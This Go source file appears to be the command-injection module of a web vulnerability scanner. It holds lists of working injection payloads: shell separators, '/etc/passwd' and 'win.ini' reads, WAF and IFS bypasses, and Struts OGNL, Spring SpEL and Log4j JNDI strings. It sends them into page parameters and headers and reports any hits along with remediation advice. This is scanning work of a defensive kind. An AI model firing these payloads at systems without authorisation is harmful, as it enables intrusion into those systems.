package rce

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

const rceMarker = "erebus_rce_0x9f4a"

var cmdPayloads = []struct {
	payload  string
	marker   string
	category string
}{
	// Echo-based detection — Linux
	{"; echo " + rceMarker, rceMarker, "OS cmd ;echo"},
	{"| echo " + rceMarker, rceMarker, "OS cmd |echo"},
	{"|| echo " + rceMarker, rceMarker, "OS cmd ||echo"},
	{"&& echo " + rceMarker, rceMarker, "OS cmd &&echo"},
	{"`echo " + rceMarker + "`", rceMarker, "OS cmd backtick"},
	{"$(echo " + rceMarker + ")", rceMarker, "OS cmd $()"},
	// Newline injection variant (bypasses single-argument parsers)
	{"%0aecho+" + rceMarker, rceMarker, "OS cmd %0a"},
	{"\necho " + rceMarker, rceMarker, "OS cmd newline"},
	// id command
	{"; id", "uid=", "id command"},
	{"| id", "uid=", "id command |"},
	{"&& id", "uid=", "id command &&"},
	{"; id #", "uid=", "id command + comment"},
	{"`;id`", "uid=", "id backtick"},
	{"$(id)", "uid=", "id $()"},
	// Windows
	{"& echo " + rceMarker, rceMarker, "Windows &echo"},
	{"| echo " + rceMarker + " &", rceMarker, "Windows |echo &"},
	{"& whoami", "authority\\", "whoami"},
	{"; cat /etc/passwd", "root:", "cat /etc/passwd"},
	{"& type C:\\Windows\\win.ini", "[fonts]", "win.ini"},
	// URL-encoded separators for WAF bypass
	{"%3becho+" + rceMarker, rceMarker, "%3b encoded ;"},
	{"%7cecho+" + rceMarker, rceMarker, "%7c encoded |"},
	// OGNL / Java Struts 2 (CVE-2017-5638 class — value parameter injection)
	{`%{7*7}`, "49", "OGNL expression"},
	{`${7*7}`, "49", "EL expression"},
	// Perl / system call markers
	{`;print(system('id'));`, "uid=", "Perl system()"},
	// Python
	{`;python3 -c "import os;os.system('echo " + rceMarker + "')"`, rceMarker, "Python os.system"},
	{`;python -c "import os;os.system('echo " + rceMarker + "')"`, rceMarker, "Python2 os.system"},
	// Ruby
	{";ruby -e \"puts `echo " + rceMarker + "`\"", rceMarker, "Ruby backtick"},
	// Node.js
	{`;node -e "require('child_process').exec('echo ` + rceMarker + `',function(e,s){process.stdout.write(s)})"`, rceMarker, "Node.js exec"},
}

var sleepPayloads = []struct {
	payload string
	delay   time.Duration
	label   string
}{
	{"; sleep 5", 5 * time.Second, "sleep 5"},
	{"| sleep 5", 5 * time.Second, "| sleep 5"},
	{"%3Bsleep+5", 5 * time.Second, "%3B sleep 5"},
	{"& ping -n 6 127.0.0.1", 5 * time.Second, "ping -n 6"},
	{"; ping -c 5 127.0.0.1", 5 * time.Second, "ping -c 5"},
	{"$(sleep 5)", 5 * time.Second, "$(sleep 5)"},
	{"`sleep 5`", 5 * time.Second, "`sleep 5`"},
	{"; timeout /t 5", 5 * time.Second, "Windows timeout"},
	{"; sleep${IFS}5", 5 * time.Second, "IFS bypass sleep"},
	{";{sleep,5}", 5 * time.Second, "brace expansion sleep"},
}

// ognlPayloads target Java EE servers — Spring, Struts, etc.
var ognlPayloads = []struct {
	payload  string
	marker   string
	category string
}{
	// Struts 2 OGNL — classic CVE class
	{
		`%25%7b%22multipart%2fform-data%22%7d`,
		"",
		"Struts2 OGNL header injection",
	},
	{
		// OGNL Java exec with marker
		`%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec("echo ` + rceMarker + `")}`,
		rceMarker,
		"Struts2 OGNL exec",
	},
	// Spring SpEL
	{
		`${T(java.lang.Runtime).getRuntime().exec('echo ` + rceMarker + `')}`,
		rceMarker,
		"SpEL exec",
	},
	// Spring cloud function CVE-2022-22963 class
	{
		`T(java.lang.Runtime).getRuntime().exec('echo ` + rceMarker + `')`,
		rceMarker,
		"Spring cloud func exec",
	},
	// Log4Shell style — only useful if server logs and reflects back
	{
		`${jndi:ldap://127.0.0.1:1389/` + rceMarker + `}`,
		rceMarker,
		"Log4j JNDI (reflected)",
	},
}

type param struct {
	name    string
	value   string
	inQuery bool
	pageURL string
	form    *crawler.Form
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "rce" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding
	params := collectParams(page)

	for _, p := range params {
		if ctx.Err() != nil {
			break
		}

		// Echo/marker-based detection
		for _, tp := range cmdPayloads {
			if ctx.Err() != nil {
				break
			}
			body, err := m.inject(ctx, p, p.value+tp.payload)
			if err != nil {
				continue
			}
			if strings.Contains(strings.ToLower(string(body)), strings.ToLower(tp.marker)) {
				findings = append(findings, modules.Finding{
					Module:      "rce",
					Severity:    modules.Critical,
					URL:         paramURL(p),
					Param:       p.name,
					Payload:     p.value + tp.payload,
					Evidence:    fmt.Sprintf("Marker %q in response (%s)", tp.marker, tp.category),
					Detail:      fmt.Sprintf("RCE confirmed (%s) in parameter %q via marker-in-response", tp.category, p.name),
					CWE:         "CWE-78",
					CVSS:        9.8,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					Confidence:  modules.Confirmed,
					Remediation: "Never pass user input to system/exec calls; use allow-lists; run with minimal OS privileges",
					Tags:        []string{"injection", "rce", "os-command"},
				})
				break
			}
		}

		// OGNL / SpEL injection
		for _, op := range ognlPayloads {
			if ctx.Err() != nil {
				break
			}
			if op.marker == "" {
				continue
			}
			body, err := m.inject(ctx, p, op.payload)
			if err != nil {
				continue
			}
			if strings.Contains(string(body), op.marker) {
				findings = append(findings, modules.Finding{
					Module:      "rce",
					Severity:    modules.Critical,
					URL:         paramURL(p),
					Param:       p.name,
					Payload:     op.payload,
					Evidence:    fmt.Sprintf("Marker %q in response (%s)", op.marker, op.category),
					Detail:      fmt.Sprintf("Java expression language RCE (%s) in parameter %q", op.category, p.name),
					CWE:         "CWE-917",
					CVSS:        10.0,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
					Confidence:  modules.Confirmed,
					Remediation: "Disable OGNL/SpEL expression evaluation on user-supplied input; apply framework security patches immediately",
					Tags:        []string{"injection", "rce", "ognl", "java", "el"},
				})
				break
			}
		}

		// Time-based blind RCE
		baselineStart := time.Now()
		_, _ = m.inject(ctx, p, p.value)
		baselineRT := time.Since(baselineStart)

		for _, sl := range sleepPayloads {
			if ctx.Err() != nil {
				break
			}
			start := time.Now()
			_, err := m.inject(ctx, p, p.value+sl.payload)
			probeRT := time.Since(start)
			if err != nil {
				continue
			}
			threshold := sl.delay - 500*time.Millisecond
			if probeRT >= threshold && probeRT > baselineRT+sl.delay/2 {
				findings = append(findings, modules.Finding{
					Module:      "rce",
					Severity:    modules.Critical,
					URL:         paramURL(p),
					Param:       p.name,
					Payload:     p.value + sl.payload,
					Evidence:    fmt.Sprintf("Probe: %v  Baseline: %v  (Δ %v — expected ≥%v)", probeRT.Round(time.Millisecond), baselineRT.Round(time.Millisecond), (probeRT - baselineRT).Round(time.Millisecond), sl.delay),
					Detail:      fmt.Sprintf("Blind RCE (time-based, %s) in parameter %q", sl.label, p.name),
					CWE:         "CWE-78",
					CVSS:        9.8,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					Confidence:  modules.Likely,
					Remediation: "Never pass user input to system/exec calls; use allow-lists; run with minimal OS privileges",
					Tags:        []string{"injection", "rce", "time-based", "blind"},
				})
				break
			}
		}
	}

	// Also test HTTP headers (User-Agent, Referer, X-Forwarded-For) for command injection
	findings = append(findings, m.testHeaders(ctx, page)...)

	return findings, nil
}

// testHeaders probes injectable HTTP headers — these are often passed to shell commands in CGI or log processing.
func (m *Module) testHeaders(ctx context.Context, page crawler.Page) []modules.Finding {
	var findings []modules.Finding
	headers := []string{"User-Agent", "Referer", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "Via"}

	for _, hdr := range headers {
		if ctx.Err() != nil {
			break
		}
		for _, tp := range []struct {
			payload  string
			marker   string
			category string
		}{
			{"; echo " + rceMarker, rceMarker, "OS cmd ;echo"},
			{"| echo " + rceMarker, rceMarker, "OS cmd |echo"},
			{"; id", "uid=", "id cmd"},
		} {
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, page.URL, nil)
			if err != nil {
				continue
			}
			req.Header.Set(hdr, "Mozilla/5.0"+tp.payload)
			resp, err := m.client.Do(req)
			if err != nil {
				continue
			}
			body, _ := client.ReadBody(resp)
			if strings.Contains(strings.ToLower(string(body)), strings.ToLower(tp.marker)) {
				findings = append(findings, modules.Finding{
					Module:      "rce",
					Severity:    modules.Critical,
					URL:         page.URL,
					Param:       hdr + " header",
					Payload:     tp.payload,
					Evidence:    fmt.Sprintf("Marker %q in response via %s header injection", tp.marker, hdr),
					Detail:      fmt.Sprintf("Header-based RCE (%s) via %s header", tp.category, hdr),
					CWE:         "CWE-78",
					CVSS:        9.8,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					Confidence:  modules.Confirmed,
					Remediation: "Sanitize all HTTP headers before passing to shell; avoid exec calls in request processing pipelines",
					Tags:        []string{"injection", "rce", "header-injection", "os-command"},
				})
				break
			}
		}
	}
	return findings
}

func (m *Module) inject(ctx context.Context, p param, value string) ([]byte, error) {
	if p.inQuery {
		u, err := url.Parse(p.pageURL)
		if err != nil {
			return nil, err
		}
		q := u.Query()
		q.Set(p.name, value)
		u.RawQuery = q.Encode()
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
		if err != nil {
			return nil, err
		}
		resp, err := m.client.Do(req)
		if err != nil {
			return nil, err
		}
		return client.ReadBody(resp)
	}
	if p.form == nil {
		return nil, fmt.Errorf("no form")
	}
	data := make(url.Values)
	for _, f := range p.form.Fields {
		if f.Name == p.name {
			data.Set(f.Name, value)
		} else if f.Value != "" {
			data.Set(f.Name, f.Value)
		} else {
			data.Set(f.Name, "test")
		}
	}
	if strings.ToUpper(p.form.Method) == "POST" {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, p.form.Action,
			strings.NewReader(data.Encode()))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := m.client.Do(req)
		if err != nil {
			return nil, err
		}
		return client.ReadBody(resp)
	}
	u, err := url.Parse(p.form.Action)
	if err != nil {
		return nil, err
	}
	u.RawQuery = data.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, err
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil, err
	}
	return client.ReadBody(resp)
}

func collectParams(page crawler.Page) []param {
	var params []param
	u, err := url.Parse(page.URL)
	if err == nil {
		for k, v := range u.Query() {
			val := ""
			if len(v) > 0 {
				val = v[0]
			}
			params = append(params, param{name: k, value: val, inQuery: true, pageURL: page.URL})
		}
	}
	for i := range page.Forms {
		for _, f := range page.Forms[i].Fields {
			if f.Type == "hidden" || f.Type == "submit" || f.Type == "button" {
				continue
			}
			params = append(params, param{
				name: f.Name, value: f.Value,
				inQuery: false, pageURL: page.URL, form: &page.Forms[i],
			})
		}
	}
	return params
}

func paramURL(p param) string {
	if p.form != nil {
		return p.form.Action
	}
	return p.pageURL
}
